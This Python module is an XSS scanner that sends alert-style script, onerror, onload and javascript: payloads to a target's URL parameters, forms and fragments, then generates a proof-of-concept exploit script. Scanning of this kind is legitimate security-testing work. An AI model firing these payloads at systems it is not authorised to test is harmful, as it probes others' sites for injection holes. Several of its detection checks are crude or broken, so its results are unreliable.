"""
SilverHand XSS Scanner - Advanced XSS detection module
Detects Cross-Site Scripting vulnerabilities with PoC generation
"""

import re
import requests
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any

class XSSScanner:
    """Advanced XSS vulnerability scanner"""
    
    def __init__(self):
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>"
        ]
        
        self.basic_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>"
        ]
    
    def scan(self, target: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Scan target for XSS vulnerabilities"""
        
        print(f"[+] Starting XSS scan on {target}")
        
        vulnerabilities = []
        
        # Test basic XSS
        basic_results = self._test_basic_xss(target)
        vulnerabilities.extend(basic_results)
        
        # Test advanced XSS
        advanced_results = self._test_advanced_xss(target)
        vulnerabilities.extend(advanced_results)
        
        # Test DOM-based XSS
        dom_results = self._test_dom_xss(target)
        vulnerabilities.extend(dom_results)
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_found': len(vulnerabilities),
            'scan_type': 'xss',
            'target': target
        }
    
    def _test_basic_xss(self, target: str) -> List[Dict[str, Any]]:
        """Test basic XSS vulnerabilities"""
        vulnerabilities = []
        
        # Test URL parameters
        if '?' in target:
            base_url = target.split('?')[0]
            params = target.split('?')[1].split('&') if len(target.split('?')) > 1 else []
            
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    
                    for payload in self.basic_payloads:
                        test_url = f"{base_url}?{param_name}={payload}"
                        
                        try:
                            response = requests.get(test_url, timeout=10)
                            
                            if self._detect_xss(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'xss',
                                    'severity': 'high',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'description': f'XSS vulnerability found in parameter {param_name}',
                                    'recommendation': 'Implement input validation and output encoding',
                                    'proof': payload
                                })
                                break
                                
                        except Exception as e:
                            print(f"[-] Error testing {test_url}: {e}")
        
        # Test forms
        form_results = self._test_forms(target)
        vulnerabilities.extend(form_results)
        
        return vulnerabilities
    
    def _test_advanced_xss(self, target: str) -> List[Dict[str, Any]]:
        """Test advanced XSS techniques"""
        vulnerabilities = []
        
        # Test with different contexts
        contexts = [
            ('html', '<div>{payload}</div>'),
            ('attribute', '<input value="{payload}">'),
            ('javascript', '<script>var x = "{payload}";</script>'),
            ('css', '<style>body {{ background: {payload} }}</style>')
        ]
        
        for context_name, context_template in contexts:
            for payload in self.payloads:
                contextual_payload = context_template.format(payload=payload)
                
                try:
                    # Test in URL parameter
                    test_url = f"{target}?test={contextual_payload}"
                    response = requests.get(test_url, timeout=10)
                    
                    if self._detect_contextual_xss(response.text, contextual_payload, context_name):
                        vulnerabilities.append({
                            'type': 'xss',
                            'severity': 'critical',
                            'url': test_url,
                            'parameter': 'test',
                            'context': context_name,
                            'payload': payload,
                            'description': f'Advanced XSS in {context_name} context',
                            'recommendation': 'Context-aware output encoding required',
                            'proof': contextual_payload
                        })
                        
                except Exception as e:
                    print(f"[-] Error in advanced XSS test: {e}")
        
        return vulnerabilities
    
    def _test_dom_xss(self, target: str) -> List[Dict[str, Any]]:
        """Test DOM-based XSS"""
        vulnerabilities = []
        
        dom_payloads = [
            "#<img src=x onerror=alert('DOM_XSS')>",
            "javascript:alert('DOM_XSS')",
            "<svg onload=alert('DOM_XSS')>"
        ]
        
        for payload in dom_payloads:
            try:
                test_url = f"{target}{payload}"
                response = requests.get(test_url, timeout=10)
                
                # Check if payload appears in response and could execute in DOM
                if payload in response.text and 'javascript:' in payload:
                    vulnerabilities.append({
                        'type': 'dom_xss',
                        'severity': 'high',
                        'url': test_url,
                        'payload': payload,
                        'description': 'Potential DOM-based XSS vulnerability',
                        'recommendation': 'Sanitize client-side inputs and use safe DOM methods',
                        'proof': payload
                    })
                    
            except Exception as e:
                print(f"[-] Error testing DOM XSS: {e}")
        
        return vulnerabilities
    
    def _test_forms(self, target: str) -> List[Dict[str, Any]]:
        """Test forms for XSS"""
        vulnerabilities = []
        
        try:
            # Get the page to find forms
            response = requests.get(target, timeout=10)
            
            # Simple form detection (in real implementation, use BeautifulSoup)
            form_pattern = r'<form[^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
            
            forms = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
            
            for form_html in forms:
                inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
                
                for input_name in inputs:
                    for payload in self.basic_payloads:
                        # Create form data
                        form_data = {input_name: payload}
                        
                        try:
                            # Submit form
                            form_response = requests.post(target, data=form_data, timeout=10)
                            
                            if self._detect_xss(form_response.text, payload):
                                vulnerabilities.append({
                                    'type': 'xss',
                                    'severity': 'high',
                                    'url': target,
                                    'form_input': input_name,
                                    'payload': payload,
                                    'description': f'XSS in form input {input_name}',
                                    'recommendation': 'Validate and encode form inputs',
                                    'proof': payload
                                })
                                break
                                
                        except Exception as e:
                            print(f"[-] Error testing form: {e}")
        
        except Exception as e:
            print(f"[-] Error getting forms: {e}")
        
        return vulnerabilities
    
    def _detect_xss(self, response_text: str, payload: str) -> bool:
        """Detect if XSS payload is reflected in response"""
        # Simple reflection check
        if payload in response_text:
            # Additional checks to avoid false positives
            if '<script>' in payload and '<script>' in response_text:
                return True
            if 'javascript:' in payload and 'javascript:' in response_text:
                return True
            if 'onerror=' in payload and 'onerror=' in response_text:
                return True
        
        return False
    
    def _detect_contextual_xss(self, response_text: str, payload: str, context: str) -> bool:
        """Detect XSS in specific contexts"""
        if payload not in response_text:
            return False
        
        # Context-aware detection
        if context == 'html':
            return '<script>' in response_text
        elif context == 'attribute':
            return 'onerror=' in response_text or 'onload=' in response_text
        elif context == 'javascript':
            return 'alert(' in response_text and 'javascript:' in response_text
        elif context == 'css':
            return 'javascript:' in response_text
        
        return False
    
    def generate_poc(self, vulnerability: Dict[str, Any]) -> str:
        """Generate PoC code for XSS vulnerability"""
        
        target = vulnerability.get('url', '')
        param = vulnerability.get('parameter', 'input')
        payload = vulnerability.get('payload', '')
        
        poc_code = f"""# XSS PoC Exploit
# Target: {target}
# Vulnerable Parameter: {param}
# Payload: {payload}

import requests

def exploit_xss():
    target_url = \"{target}\"
    xss_payload = \"{payload}\"
    
    try:
        if \'{param}\' in target_url:
            exploit_url = target_url.replace(\'{param}=\', f\'{param}={{xss_payload}}\')
        else:
            exploit_url = f\"{{target_url}}?{param}={{xss_payload}}\"
        
        response = requests.get(exploit_url, timeout=10)
        
        if xss_payload in response.text:
            print(\"[+] XSS Exploit Successful!\")
        else:
            print(\"[-] XSS Exploit Failed\")
            
    except Exception as e:
        print(f\"[-] Error: {{e}}\")

if __name__ == \"__main__\":
    exploit_xss()
"""
        return poc_code

